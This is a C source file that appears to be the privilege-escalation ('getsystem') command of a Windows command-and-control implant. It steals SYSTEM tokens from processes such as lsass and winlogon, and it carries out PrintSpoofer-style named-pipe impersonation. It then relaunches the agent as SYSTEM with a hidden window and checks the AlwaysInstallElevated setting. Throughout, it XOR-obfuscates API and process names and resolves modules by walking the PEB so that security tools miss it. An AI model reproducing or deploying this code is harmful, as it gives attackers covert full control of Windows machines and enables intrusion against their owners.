#include "evasion.h"
#include "inject.h"
#include "beacon.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include "adv_lazy.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* GetComputerNameW */
typedef BOOL(WINAPI *_GCNW_t)(LPWSTR, LPDWORD);
static BOOL _gcnw(LPWSTR buf, LPDWORD sz)
{
    static _GCNW_t fn = NULL;
    if (!fn)
    {
        char fs[20], ks[14];
        volatile unsigned char xk = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_GetComputerNameW); i++)
            fs[i] = (char)(EVS_fn_GetComputerNameW[i] ^ xk);
        fs[sizeof(EVS_fn_GetComputerNameW)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_kernel32); i++)
            ks[i] = (char)(EVS_dll_kernel32[i] ^ xk);
        ks[sizeof(EVS_dll_kernel32)] = '\0';
        HMODULE m = _peb_module(ks);
        SecureZeroMemory(ks, sizeof(ks));
        if (m)
            fn = (_GCNW_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    return fn ? fn(buf, sz) : FALSE;
}

/* All advapi32 / kernel32 token/pipe APIs resolved at runtime. */
typedef BOOL(WINAPI *fn_OpenProcessToken_t)(HANDLE, DWORD, PHANDLE);
typedef BOOL(WINAPI *fn_OpenThreadToken_t)(HANDLE, DWORD, BOOL, PHANDLE);
typedef BOOL(WINAPI *fn_DuplicateTokenEx_t)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
typedef BOOL(WINAPI *fn_GetTokenInformation_t)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
typedef BOOL(WINAPI *fn_SetThreadToken_t)(PHANDLE, HANDLE);
typedef BOOL(WINAPI *fn_RevertToSelf_t)(void);
typedef BOOL(WINAPI *fn_LookupPrivilegeValueA_t)(LPCSTR, LPCSTR, PLUID);
typedef BOOL(WINAPI *fn_PrivilegeCheck_t)(HANDLE, PPRIVILEGE_SET, LPBOOL);
typedef BOOL(WINAPI *fn_AllocateAndInitializeSid_t)(PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID *);
typedef BOOL(WINAPI *fn_EqualSid_t)(PSID, PSID);
typedef PVOID(WINAPI *fn_FreeSid_t)(PSID);
typedef BOOL(WINAPI *fn_ImpersonateNamedPipeClient_t)(HANDLE);
typedef HANDLE(WINAPI *fn_CreateNamedPipeA_t)(LPCSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
typedef BOOL(WINAPI *fn_ConnectNamedPipe_t)(HANDLE, LPOVERLAPPED);
typedef BOOL(WINAPI *fn_CreateProcessWithTokenW_t)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI *fn_CreateProcessAsUserW_t)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

typedef struct
{
    fn_OpenProcessToken_t OpenProcessToken;
    fn_OpenThreadToken_t OpenThreadToken;
    fn_DuplicateTokenEx_t DuplicateTokenEx;
    fn_GetTokenInformation_t GetTokenInformation;
    fn_SetThreadToken_t SetThreadToken;
    fn_RevertToSelf_t RevertToSelf;
    fn_LookupPrivilegeValueA_t LookupPrivilegeValueA;
    fn_PrivilegeCheck_t PrivilegeCheck;
    fn_AllocateAndInitializeSid_t AllocateAndInitializeSid;
    fn_EqualSid_t EqualSid;
    fn_FreeSid_t FreeSid;
    fn_ImpersonateNamedPipeClient_t ImpersonateNamedPipeClient;
    fn_CreateNamedPipeA_t CreateNamedPipeA;
    fn_ConnectNamedPipe_t ConnectNamedPipe;
    fn_CreateProcessWithTokenW_t CreateProcessWithTokenW;
    fn_CreateProcessAsUserW_t CreateProcessAsUserW;
} gs_api_t;

static int _resolve_apis(gs_api_t *api)
{
    /* APIs already EVS-resolved by adv_lazy — reuse, no duplicate resolution */
    const adv_api_t *adv = adv_get();
    if (!adv) return -1;
    api->OpenProcessToken      = adv->OpenProcessToken;
    api->OpenThreadToken       = adv->OpenThreadToken;
    api->DuplicateTokenEx      = adv->DuplicateTokenEx;
    api->LookupPrivilegeValueA = adv->LookupPrivilegeValueA;
    api->RevertToSelf          = adv->RevertToSelf;

    /* Module handles via EVS-decoded names + PEB walk — no plaintext in binary */
    char dll_a[13], dll_k[13];
    EVS_D(dll_a, EVS_dll_advapi32);
    EVS_D(dll_k, EVS_dll_kernel32);
    HMODULE had  = _peb_module(dll_a);
    HMODULE hk32 = _peb_module(dll_k);
    SecureZeroMemory(dll_a, sizeof(dll_a));
    SecureZeroMemory(dll_k, sizeof(dll_k));
    if (!had || !hk32) return -1;

    /* Remaining APIs — EVS XOR bytes at rest, decoded to stack, cleared after use */
    char fn[28];

    EVS_D(fn, EVS_fn_GetTokenInformation);
    api->GetTokenInformation = (fn_GetTokenInformation_t)(void *)GetProcAddress(had, fn);
    SecureZeroMemory(fn, sizeof(fn));

    EVS_D(fn, EVS_fn_SetThreadToken);
    api->SetThreadToken = (fn_SetThreadToken_t)(void *)GetProcAddress(had, fn);
    SecureZeroMemory(fn, sizeof(fn));

    EVS_D(fn, EVS_fn_PrivilegeCheck);
    api->PrivilegeCheck = (fn_PrivilegeCheck_t)(void *)GetProcAddress(had, fn);
    SecureZeroMemory(fn, sizeof(fn));

    EVS_D(fn, EVS_fn_AllocateAndInitializeSid);
    api->AllocateAndInitializeSid = (fn_AllocateAndInitializeSid_t)(void *)GetProcAddress(had, fn);
    SecureZeroMemory(fn, sizeof(fn));

    EVS_D(fn, EVS_fn_EqualSid);
    api->EqualSid = (fn_EqualSid_t)(void *)GetProcAddress(had, fn);
    SecureZeroMemory(fn, sizeof(fn));

    EVS_D(fn, EVS_fn_FreeSid);
    api->FreeSid = (fn_FreeSid_t)(void *)GetProcAddress(had, fn);
    SecureZeroMemory(fn, sizeof(fn));

    EVS_D(fn, EVS_fn_ImpersonateNamedPipeClient);
    api->ImpersonateNamedPipeClient = (fn_ImpersonateNamedPipeClient_t)(void *)GetProcAddress(had, fn);
    SecureZeroMemory(fn, sizeof(fn));

    EVS_D(fn, EVS_fn_CreateProcessWithTokenW);
    api->CreateProcessWithTokenW = (fn_CreateProcessWithTokenW_t)(void *)GetProcAddress(had, fn);
    SecureZeroMemory(fn, sizeof(fn));

    EVS_D(fn, EVS_fn_CreateProcessAsUserW);
    api->CreateProcessAsUserW = (fn_CreateProcessAsUserW_t)(void *)GetProcAddress(had, fn);
    SecureZeroMemory(fn, sizeof(fn));

    EVS_D(fn, EVS_fn_CreateNamedPipeA);
    api->CreateNamedPipeA = (fn_CreateNamedPipeA_t)(void *)GetProcAddress(hk32, fn);
    SecureZeroMemory(fn, sizeof(fn));

    EVS_D(fn, EVS_fn_ConnectNamedPipe);
    api->ConnectNamedPipe = (fn_ConnectNamedPipe_t)(void *)GetProcAddress(hk32, fn);
    SecureZeroMemory(fn, sizeof(fn));

    return (api->OpenProcessToken && api->DuplicateTokenEx &&
            api->ImpersonateNamedPipeClient && api->CreateNamedPipeA)
               ? 0 : -1;
}

static int _is_system_sid(gs_api_t *api, HANDLE hToken)
{
    BYTE buf[256];
    DWORD cb = sizeof(buf);
    if (!api->GetTokenInformation(hToken, TokenUser, buf, cb, &cb))
        return 0;
    TOKEN_USER *tu = (TOKEN_USER *)buf;
    PSID sys = NULL;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (!api->AllocateAndInitializeSid(&auth, 1, SECURITY_LOCAL_SYSTEM_RID,
                                       0, 0, 0, 0, 0, 0, 0, &sys))
        return 0;
    int r = api->EqualSid(tu->User.Sid, sys);
    api->FreeSid(sys);
    return r;
}

/* Method 1: token theft from a SYSTEM process                         */

static int _steal_system_token(gs_api_t *api, HANDLE *out, char *buf, size_t sz)
{
    volatile unsigned char _k = EVS_KEY;
    char t0[13], t1[13], t2[12], t3[10];
    for (int _i = 0; _i < (int)sizeof(EVS_str_winlogon_exe); _i++)
        t0[_i] = (char)(EVS_str_winlogon_exe[_i] ^ _k);
    t0[sizeof(EVS_str_winlogon_exe)] = 0;
    for (int _i = 0; _i < (int)sizeof(EVS_str_services_exe); _i++)
        t1[_i] = (char)(EVS_str_services_exe[_i] ^ _k);
    t1[sizeof(EVS_str_services_exe)] = 0;
    for (int _i = 0; _i < (int)sizeof(EVS_str_spoolsv_exe); _i++)
        t2[_i] = (char)(EVS_str_spoolsv_exe[_i] ^ _k);
    t2[sizeof(EVS_str_spoolsv_exe)] = 0;
    for (int _i = 0; _i < (int)sizeof(EVS_str_lsass_exe); _i++)
        t3[_i] = (char)(EVS_str_lsass_exe[_i] ^ _k);
    t3[sizeof(EVS_str_lsass_exe)] = 0;
    const char *targets[] = {t0, t1, t2, t3, NULL};

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return -1;

    PROCESSENTRY32 pe = {sizeof(pe)};
    int found = 0;

    if (Process32First(snap, &pe))
        do
        {
            int hit = 0;
            for (int i = 0; targets[i]; i++)
                if (_stricmp(pe.szExeFile, targets[i]) == 0)
                {
                    hit = 1;
                    break;
                }
            if (!hit)
                continue;

            /* indirect NtOpenProcess */
            HANDLE hp = inject_nt_open_process(pe.th32ProcessID, PROCESS_QUERY_INFORMATION);
            if (!hp)
                continue;

            HANDLE ht = NULL;
            if (!api->OpenProcessToken(hp, TOKEN_DUPLICATE | TOKEN_QUERY, &ht))
            {
                CloseHandle(hp);
                continue;
            }
            CloseHandle(hp);

            if (!_is_system_sid(api, ht))
            {
                CloseHandle(ht);
                continue;
            }

            HANDLE hdup = NULL;
            SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, FALSE};
            BOOL ok = api->DuplicateTokenEx(ht, TOKEN_ALL_ACCESS, &sa,
                                            SecurityImpersonation, TokenImpersonation, &hdup);
            CloseHandle(ht);
            if (!ok)
                continue;

            *out = hdup;
            snprintf(buf, sz, "ok:t %lu\n", (unsigned long)pe.th32ProcessID);
            found = 1;
            break;
        } while (Process32Next(snap, &pe));

    CloseHandle(snap);
    return found ? 0 : -1;
}

/* Method 2: named pipe impersonation (PrintSpoofer-style)             */

typedef struct
{
    gs_api_t *api;
    HANDLE pipe;
    HANDLE token;
    volatile int done;
} _pipe_ctx;

static DWORD WINAPI _pipe_thread(LPVOID p)
{
    evasion_apply_thread(GetCurrentThread());

    _pipe_ctx *ctx = (_pipe_ctx *)p;
    gs_api_t *api = ctx->api;

    if (!api->ConnectNamedPipe(ctx->pipe, NULL) &&
        GetLastError() != ERROR_PIPE_CONNECTED)
    {
        ctx->done = -1;
        return 0;
    }

    if (!api->ImpersonateNamedPipeClient(ctx->pipe))
    {
        ctx->done = -1;
        return 0;
    }

    HANDLE ht = NULL;
    if (!api->OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, FALSE, &ht))
    {
        api->RevertToSelf();
        ctx->done = -1;
        return 0;
    }

    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, FALSE};
    api->DuplicateTokenEx(ht, TOKEN_ALL_ACCESS, &sa,
                          SecurityImpersonation, TokenImpersonation, &ctx->token);
    CloseHandle(ht);
    api->RevertToSelf();
    ctx->done = 1;
    return 0;
}

static int _pipe_impersonate(gs_api_t *api, HANDLE *out, char *buf, size_t sz)
{
    DWORD tick = GetTickCount();

    char pipe_a[128];
    snprintf(pipe_a, sizeof(pipe_a),
             "\\\\.\\pipe\\svc%04lx\\pipe\\spoolss", tick & 0xFFFF);

    HANDLE hp = api->CreateNamedPipeA(pipe_a,
                                      PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                                      PIPE_TYPE_BYTE | PIPE_WAIT, 1, 4096, 4096, 0, NULL);
    if (hp == INVALID_HANDLE_VALUE)
    {
        snprintf(buf, sz, "e:np %lu\n", GetLastError());
        return -1;
    }

    /* heap-allocate ctx so the thread never touches freed stack */
    _pipe_ctx *ctx = (_pipe_ctx *)calloc(1, sizeof(_pipe_ctx));
    if (!ctx)
    {
        CloseHandle(hp);
        return -1;
    }
    ctx->api = api;
    ctx->pipe = hp;

    HANDLE ht = CreateThread(NULL, 0, _pipe_thread, ctx, 0, NULL);
    if (!ht)
    {
        CloseHandle(hp);
        free(ctx);
        return -1;
    }

    char dll_ws[13], fn_opw[13], fn_cpr[13];
    EVS_D(dll_ws, EVS_dll_winspool);
    HMODULE hw = LoadLibraryA(dll_ws);
    SecureZeroMemory(dll_ws, sizeof(dll_ws));
    if (hw)
    {
        typedef BOOL(WINAPI * fnOPW)(LPWSTR, HANDLE *, LPVOID);
        typedef BOOL(WINAPI * fnCPR)(HANDLE);
        EVS_D(fn_opw, EVS_fn_OpenPrinterW);
        EVS_D(fn_cpr, EVS_fn_ClosePrinter);
        fnOPW pOPW = (fnOPW)(void *)GetProcAddress(hw, fn_opw);
        fnCPR pCPR = (fnCPR)(void *)GetProcAddress(hw, fn_cpr);
        SecureZeroMemory(fn_opw, sizeof(fn_opw));
        SecureZeroMemory(fn_cpr, sizeof(fn_cpr));
        if (pOPW)
        {
            wchar_t host[MAX_COMPUTERNAME_LENGTH + 2];
            DWORD hsz = MAX_COMPUTERNAME_LENGTH + 1;
            _gcnw(host, &hsz);
            wchar_t trigger[256];
            _snwprintf(trigger, 256, L"\\\\%s/pipe/svc%04lx", host, tick & 0xFFFF);
            HANDLE hpr = NULL;
            pOPW(trigger, &hpr, NULL);
            if (hpr && pCPR)
                pCPR(hpr);
        }
        FreeLibrary(hw);
    }

    /* wait for thread; terminate if it didn't finish in time */
    DWORD w = WaitForSingleObject(ht, 3000);
    if (w != WAIT_OBJECT_0)
        TerminateThread(ht, 0);
    CloseHandle(ht);
    CloseHandle(hp);

    HANDLE tok = ctx->token;
    int done = ctx->done;
    free(ctx);

    if (done != 1 || !tok)
    {
        snprintf(buf, sz, "e:pipe\n");
        if (tok)
            CloseHandle(tok);
        return -1;
    }
    *out = tok;
    snprintf(buf, sz, "ok:p\n");
    return 0;
}

/* Method 3: spawn agent as SYSTEM via primary token                   */

static int _spawn_as_system(gs_api_t *api, HANDLE hImpTok, char *buf, size_t sz)
{
    if (!api->CreateProcessWithTokenW && !api->CreateProcessAsUserW)
        return -1;

    /* Duplicate impersonation token to primary token */
    HANDLE hPrim = NULL;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, FALSE};
    if (!api->DuplicateTokenEx(hImpTok, TOKEN_ALL_ACCESS, &sa,
                               SecurityImpersonation, TokenPrimary, &hPrim))
    {
        size_t off = strlen(buf);
        snprintf(buf + off, sz - off,
                 "[gs] dup→primary failed: %lu\n", GetLastError());
        return -1;
    }

    WCHAR exe[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, exe, MAX_PATH);

    /* Tag child so C2 links it to this session. No gs_flagchild is already SYSTEM. */
    char own_id[AGENT_ID_LEN + 1];
    agent_gen_id(own_id);
    agent_write_parent_id(own_id);

    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    BOOL ok = FALSE;
    DWORD flags = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP;

    if (api->CreateProcessWithTokenW)
        ok = api->CreateProcessWithTokenW(
            hPrim, LOGON_WITH_PROFILE, exe, NULL, flags, NULL, NULL, &si, &pi);

    if (!ok && api->CreateProcessAsUserW)
    {
        /* LOGON_WITH_PROFILE not needed for CreateProcessAsUserW */
        HANDLE hPrim2 = NULL;
        if (api->DuplicateTokenEx(hImpTok, TOKEN_ALL_ACCESS, &sa,
                                  SecurityImpersonation, TokenPrimary, &hPrim2))
        {
            ok = api->CreateProcessAsUserW(
                hPrim2, exe, NULL, NULL, NULL, FALSE, flags, NULL, NULL, &si, &pi);
            CloseHandle(hPrim2);
        }
    }

    CloseHandle(hPrim);

    if (!ok)
    {
        size_t off = strlen(buf);
        snprintf(buf + off, sz - off, "e:cp %lu\n", GetLastError());
        return -1;
    }

    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);
    size_t off = strlen(buf);
    snprintf(buf + off, sz - off, "ok:s %lu\n", (unsigned long)pi.dwProcessId);
    return 0;
}

/* AlwaysInstallElevated check                                          */

static void _check_aie(char *buf, size_t sz)
{
    volatile unsigned char _k = EVS_KEY;
    char _rp[52], _rv[22];
    for (int _i = 0; _i < (int)sizeof(EVS_str_reg_installer_policy); _i++)
        _rp[_i] = (char)(EVS_str_reg_installer_policy[_i] ^ _k);
    _rp[sizeof(EVS_str_reg_installer_policy)] = '\0';
    for (int _i = 0; _i < (int)sizeof(EVS_str_AlwaysInstallElevated); _i++)
        _rv[_i] = (char)(EVS_str_AlwaysInstallElevated[_i] ^ _k);
    _rv[sizeof(EVS_str_AlwaysInstallElevated)] = '\0';

    DWORD hklm = 0, hkcu = 0, cb = sizeof(DWORD);
    RegGetValueA(HKEY_LOCAL_MACHINE, _rp, _rv, RRF_RT_REG_DWORD, NULL, &hklm, &cb);
    cb = sizeof(DWORD);
    RegGetValueA(HKEY_CURRENT_USER, _rp, _rv, RRF_RT_REG_DWORD, NULL, &hkcu, &cb);
    SecureZeroMemory(_rp, sizeof(_rp));
    SecureZeroMemory(_rv, sizeof(_rv));

    size_t off = strlen(buf);
    if (off >= sz - 1)
        return;
    if (hklm == 1 && hkcu == 1)
    {
        char _t1[] = {'[', 'g', 's', ']', ' ', 'A', 'I', 'E', '=', 'V', 'U', 'L', 'N',
                      'E', 'R', 'A', 'B', 'L', 'E', ' ', '(', 'H', 'K', 'L', 'M', '+',
                      'H', 'K', 'C', 'U', '=', '1', ')', '\n', 0};
        snprintf(buf + off, sz - off, "%s", _t1);
    }
    else
        snprintf(buf + off, sz - off,
                 "[gs] AIE=no (HKLM=%lu HKCU=%lu)\n",
                 hklm, hkcu);
}

int cmd_getsystem(const char *args, char *out, size_t sz)
{
    (void)args;
    memset(out, 0, sz);

    gs_api_t api;
    if (_resolve_apis(&api) != 0)
    {
        snprintf(out, sz, "e:api\n");
        return -1;
    }

    /* check SeImpersonatePrivilege */
    {
        HANDLE htok = NULL;
        if (api.OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htok))
        {
            LUID luid = {0};
            char _sp[24];
            volatile unsigned char _k = EVS_KEY;
            for (int _i = 0; _i < (int)sizeof(EVS_str_SeImpersonatePrivilege); _i++)
                _sp[_i] = (char)(EVS_str_SeImpersonatePrivilege[_i] ^ _k);
            _sp[sizeof(EVS_str_SeImpersonatePrivilege)] = '\0';
            api.LookupPrivilegeValueA(NULL, _sp, &luid);
            SecureZeroMemory(_sp, sizeof(_sp));
            PRIVILEGE_SET ps;
            ps.PrivilegeCount = 1;
            ps.Control = 0;
            ps.Privilege[0].Luid = luid;
            ps.Privilege[0].Attributes = 0;
            BOOL has = FALSE;
            api.PrivilegeCheck(htok, &ps, &has);
            CloseHandle(htok);
            if (!has)
            {
                char _nm[] = {'[', 'g', 's', ']', ' ', 'S', 'e', 'I', 'm', 'p', 'e', 'r', 's', 'o',
                              'n', 'a', 't', 'e', ' ', 'n', 'o', 't', ' ', 'h', 'e', 'l', 'd', '\n', 0};
                snprintf(out, sz, "%s", _nm);
                _check_aie(out, sz);
                return -1;
            }
        }
    }

    evasion_apply_thread(GetCurrentThread());

    HANDLE sys_tok = NULL;
    int rc = _steal_system_token(&api, &sys_tok, out, sz);
    if (rc != 0)
        rc = _pipe_impersonate(&api, &sys_tok, out, sz);

    if (rc == 0 && sys_tok)
    {
        /* Primary: spawn agent with primary SYSTEM token (bypasses GPO/AppLocker) */
        int spawn_rc = _spawn_as_system(&api, sys_tok, out, sz);

        /* Also apply thread impersonation so current session is SYSTEM */
        api.SetThreadToken(NULL, sys_tok);
        CloseHandle(sys_tok);

        if (spawn_rc == 0)
        {
            size_t off = strlen(out);
            if (off < sz - 1)
                snprintf(out + off, sz - off, "ok\n");
            return 0;
        }
        size_t off = strlen(out);
        if (off < sz - 1)
            snprintf(out + off, sz - off, "ok:thr\n");
        return 0;
    }

    size_t off = strlen(out);
    if (off < sz - 1)
        snprintf(out + off, sz - off, "e:all\n");
    _check_aie(out, sz);
    return -1;
}
